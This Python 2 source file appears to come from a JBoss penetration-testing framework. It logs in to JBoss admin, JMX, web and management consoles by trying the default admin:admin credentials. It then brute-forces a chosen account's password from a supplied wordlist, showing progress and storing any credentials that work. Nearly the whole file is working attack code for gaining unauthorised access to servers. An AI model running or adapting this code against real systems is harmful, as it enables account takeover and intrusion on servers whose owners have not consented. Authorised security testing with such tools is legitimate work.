from src.platform.jboss.interfaces import JINTERFACES
from requests.auth import HTTPBasicAuth, HTTPDigestAuth
from requests.utils import dict_from_cookiejar
from collections import OrderedDict
from sys import stdout
from log import LOG
import state
import utility

""" Return a tuple of cookies and an auth object.  Versions 7.x of JBoss
return only a username/password, because it is ridiculous and breaks compatability
"""

#
# list of tuples consisting of (username, password) to try when
# a 401 is discovered.
#
default_credentials = [("admin", "admin")]

def _auth(usr, pswd, url, version):
    """
    """

    authobj = HTTPBasicAuth
    if version in ['7.0', '7.1']:
        authobj = HTTPDigestAuth

    res = utility.requests_get(url, auth=authobj(usr, pswd))

    if res.status_code is 200:
        utility.Msg("Successfully authenticated with %s:%s" % (usr, pswd), LOG.DEBUG)
        return (dict_from_cookiejar(res.cookies), authobj(usr, pswd))


def checkAuth(ip, port, title, version):
    """
    """

    if version in ["5.1", "6.0", "6.1"] and title is JINTERFACES.WM:
        for (usr, pswd) in default_credentials:
            url = "http://%s:%s/admin-console/login.seam" % (ip, port)
            data = OrderedDict([
                    ("login_form", "login_form"),
                    ("login_form:name", usr),
                    ("login_form:password", pswd),
                    ("login_form:submit", "Login"),
                    ("javax.faces.ViewState", utility.fetch_viewState(url)),
                   ])

            response = utility.requests_post(url, data=data)
            if response.status_code == 200:
                utility.Msg("Successfully authenticated with %s:%s" % (usr, pswd), LOG.DEBUG)
                if version in ["5.1"]:
                    return (dict_from_cookiejar(response.history[0].cookies), None)
                return (dict_from_cookiejar(response.cookies), None)

    else:
        if title is JINTERFACES.JMX:
            url = "http://%s:%s/jmx-console/" % (ip, port)
        elif title is JINTERFACES.MM:
            url = "http://%s:%s/management" % (ip, port)
        elif title is JINTERFACES.WC:
            url = "http://%s:%s/web-console" % (ip, port)
        else:
            utility.Msg("Unsupported auth interface: %s" % title, LOG.DEBUG)
            return

        # check with given auth
        if state.usr_auth:
            (usr, pswd) = state.usr_auth.split(':')
            return _auth(usr, pswd, url, version)

        # else try default credentials
        for (usr, pswd) in default_credentials:
            cook = _auth(usr, pswd, url, version)
            if cook:
                return cook

        # if we're still here, check if they supplied a wordlist
        if state.bf_wordlist and not state.hasbf:

            state.hasbf = True
            wordlist = []
            with open(state.bf_wordlist, 'r') as f:
                # ensure everything is ascii or requests will explode
                wordlist = [x.decode("ascii", "ignore").rstrip() for x in f.readlines()]

            utility.Msg("Brute forcing %s account with %d passwords..." %
                                        (state.bf_user, len(wordlist)), LOG.DEBUG)

            try:
                for (idx, word) in enumerate(wordlist):
                    stdout.flush()
                    stdout.write("\r\033[32m [%s] Brute forcing password for %s [%d/%d]\033[0m" \
                                        % (utility.timestamp(), state.bf_user,
                                           idx+1, len(wordlist)))

                    cook = _auth(state.bf_user, word, url, version)
                    if cook:
                        print ''  # newline

                        # lets insert these credentials to the default list so we
                        # don't need to bruteforce it each time
                        if not (state.bf_user, word) in default_credentials:
                            default_credentials.insert(0, (state.bf_user, word))

                        utility.Msg("Successful login %s:%s" % 
                                        (state.bf_user, word), LOG.SUCCESS)
                        return cook

                print ''

            except KeyboardInterrupt:
                pass
